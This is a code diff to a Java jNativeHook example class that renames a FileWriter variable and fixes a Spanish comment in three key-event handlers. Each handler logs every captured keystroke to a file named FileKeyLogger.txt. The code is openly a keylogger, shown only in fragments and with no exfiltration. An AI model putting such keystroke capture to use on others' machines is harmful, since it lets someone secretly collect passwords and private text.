@@ -16,10 +16,10 @@ public class jNativeHookExample implements NativeKeyListener{
         try {
         	System.out.println("---------------------------------------------");
         	File archivoKeyLogger = new File("FileKeyLogger.txt");
-			FileWriter writeIntegers = new FileWriter(archivoKeyLogger, true);
-			writeIntegers.write(NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
-			//cerramos la conexion
-			writeIntegers.close();
+			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
+			writeResults.write(NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
+			//cerramos la conexión
+			writeResults.close();
 		} catch (IOException e2) {
 			System.out.println("Error al escribir");
 		}
@@ -41,10 +41,10 @@ public class jNativeHookExample implements NativeKeyListener{
 		try {
 			System.out.println("---------------------------------------------");
 			File archivoKeyLogger = new File("FileKeyLogger.txt");
-			FileWriter writeIntegers = new FileWriter(archivoKeyLogger, true);
-			writeIntegers.write( NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
-			//cerramos la conexion
-			writeIntegers.close();
+			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
+			writeResults.write( NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
+			//cerramos la conexión
+			writeResults.close();
 		} catch (IOException e1) {
 			// TODO Auto-generated catch block
 			System.out.println("Error al escribir");
@@ -57,10 +57,10 @@ public class jNativeHookExample implements NativeKeyListener{
         try {
         	System.out.println("---------------------------------------------");
 			File archivoKeyLogger = new File("FileKeyLogger.txt");
-			FileWriter writeIntegers = new FileWriter(archivoKeyLogger, true);
-			writeIntegers.write(e.getKeyText(e.getKeyCode()) + "\r" + "\n");
-			//cerramos la conexion
-			writeIntegers.close();
+			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
+			writeResults.write(e.getKeyText(e.getKeyCode()) + "\r" + "\n");
+			//cerramos la conexión
+			writeResults.close();
 		} catch (IOException e1) {
 			// TODO Auto-generated catch block
 			System.out.println("Error al escribir");
